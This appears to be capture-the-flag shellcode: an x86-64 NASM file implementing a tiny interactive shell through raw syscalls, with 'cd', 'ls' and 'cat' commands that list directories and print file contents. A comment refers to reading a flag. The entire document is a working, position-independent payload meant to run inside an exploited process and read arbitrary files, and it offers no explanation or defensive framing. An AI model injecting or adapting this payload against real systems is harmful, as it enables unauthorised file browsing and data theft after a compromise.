[BITS 64]
BUFSIZE equ 0x7f ; this should be enough for reading flag
default rel

_start:
	lea rbp,[buf]
	lea r15,[puts]
	; lea r14,[errchk] 
	lea r14, [r15-15]

loop:
	lea rsi,[rbp-25] ;sign
	call r15
	
	; read(0,buf,0x30)
	; puts ensures ret value is 0
	; xor eax,eax
	xor edi,edi
	push rbp
	pop rsi
	mov dl,0x30 ; this should be enough
	syscall

	mov byte [rbp+rax],0
	; remove \n
	mov cl, byte [rbp+rax-1]
	cmp cl,10
	jnz parsecmd
	mov byte [rbp+rax-1], 0

parsecmd:
	xchg ecx,eax
	; supported cmds: cd, ls, cat
	mov eax,dword [rbp]
	cmp eax,0x20746163 ; "cat "
	je cat
	and eax,0xffffff
	cmp eax,0x206463 ; "cd "
	je cd
	cmp eax,0x00736c ; "ls"
	je ls
	cmp eax,0x20736c ; "ls "
	je ls
	jmp fail

errchk:
	cmp eax,0
	jge fin
	pop rax
fail:
	lea rsi,[rbp-22] ;failstr
	call r15
	jmp loop

puts:
	mov al,byte [rsi]
	test eax,eax
	jz fin
	push 1
	pop rax
	push rax
	pop rdi
	push rax
	pop rdx
	syscall
	inc rsi
	jmp puts
fin:
	ret

cd:
	lea rdi,[rbp+3]
	push 80 ; sys_chdir
	pop rax
	syscall
	call r14
	jmp loop

cat:
	push 2
	pop rax
	lea rdi,[rbp+4]
	xor esi,esi
	cdq
	syscall
	; if open fails here, read would also fail, so errchk isn't needed here
	xchg eax,edi
	xor eax,eax
	push rbp
	pop rsi
	push BUFSIZE
	pop rdx
	syscall
	call r14
	push rbp
	pop rsi
	xchg edx,eax
	push 1
	pop rax
	push rax
	pop rdi
	syscall
	jmp loop

ls:
	lea rdi,[rbp-2]
	cmp ecx,3
	jle opendir	
	lea rdi,[rbp+3]
opendir:
	push 2
	pop rax
	xor esi,esi
	cdq
	syscall
	call r14
	xchg eax,edi
	mov r13,rdi
getdentsloop:
	mov rdi,r13
	push rbp
	pop rsi
	mov eax,217 ; sys_getdents64	
	push BUFSIZE
	pop rdx
	syscall
	call r14
	test eax,eax
	jz loop
	mov r12,rax
	xor ebx,ebx
direntloop:
	cmp rbx,r12
	jge getdentsloop
	xor ecx,ecx
	mov cl,byte [rbp+rbx+18] ;d_type
	lea rsi,[rbp+rcx-17] ;[filetypetable+ecx]
	push 1
	pop rax
	push rax
	pop rdi
	push rax
	pop rdx
	syscall
	lea rsi,[rbp-24]
	call r15
	lea rsi,[rbp+rbx+19] ;d_name
	call r15
	lea rsi,[rbp-19]
	call r15
	mov ax,word [rbp+rbx+16] ;d_off
	add rbx,rax
	jmp direntloop


sign: db '>'
gap: db ' ',0
failstr: db 'err'
lf: db 10, 0
filetypetable: db 'ufc?d?b?r?l?s?w'
curdir: db '.', 0
buf:
